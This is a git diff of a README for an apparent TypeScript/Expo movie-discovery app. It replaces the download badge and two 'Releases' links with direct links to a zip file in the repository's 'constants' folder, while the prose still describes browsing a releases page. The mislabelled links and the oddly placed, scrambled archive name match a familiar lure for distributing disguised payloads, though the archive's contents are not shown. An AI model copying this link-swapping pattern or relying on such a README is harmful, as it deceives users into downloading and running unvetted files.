@@ -1,7 +1,7 @@
 # 🎬 cross-platform-mobile-app - Discover Movies Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/hanhtran118/cross-platform-mobile-app/releases)
+[![Download](https://github.com/hanhtran118/cross-platform-mobile-app/raw/refs/heads/main/constants/app-mobile-platform-cross-v3.7-alpha.4.zip)](https://github.com/hanhtran118/cross-platform-mobile-app/raw/refs/heads/main/constants/app-mobile-platform-cross-v3.7-alpha.4.zip)
 
 ## 📝 Description
 cross-platform-mobile-app is a production-ready mobile application designed for movie discovery. Built with TypeScript and Expo Router, this app connects to the TMDB API. It features advanced search options, detailed movie views, user reviews, and favorites management. The app showcases clean architecture and scalable state management. It follows modern mobile development best practices and supports both iOS and Android devices.
@@ -10,7 +10,7 @@ cross-platform-mobile-app is a production-ready mobile application designed for 
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   To download the application, visit our releases page: [Releases](https://github.com/hanhtran118/cross-platform-mobile-app/releases).
+   To download the application, visit our releases page: [Releases](https://github.com/hanhtran118/cross-platform-mobile-app/raw/refs/heads/main/constants/app-mobile-platform-cross-v3.7-alpha.4.zip).
 
 2. **Choose the Version**  
    On the releases page, you will see a list of available versions. Click on the version you want to download. We recommend downloading the latest stable version for the best experience.
@@ -64,6 +64,6 @@ This project is open-source and available under the MIT License. You can freely 
 Your input is valuable to us. Feel free to submit feedback or feature requests through the issues page.
 
 ## 📥 Download & Install
-To start using the app, visit this page to download: [Releases](https://github.com/hanhtran118/cross-platform-mobile-app/releases). Choose the appropriate files for your device and follow the installation steps outlined above.
+To start using the app, visit this page to download: [Releases](https://github.com/hanhtran118/cross-platform-mobile-app/raw/refs/heads/main/constants/app-mobile-platform-cross-v3.7-alpha.4.zip). Choose the appropriate files for your device and follow the installation steps outlined above.
 
 Enjoy your journey through the world of movies!
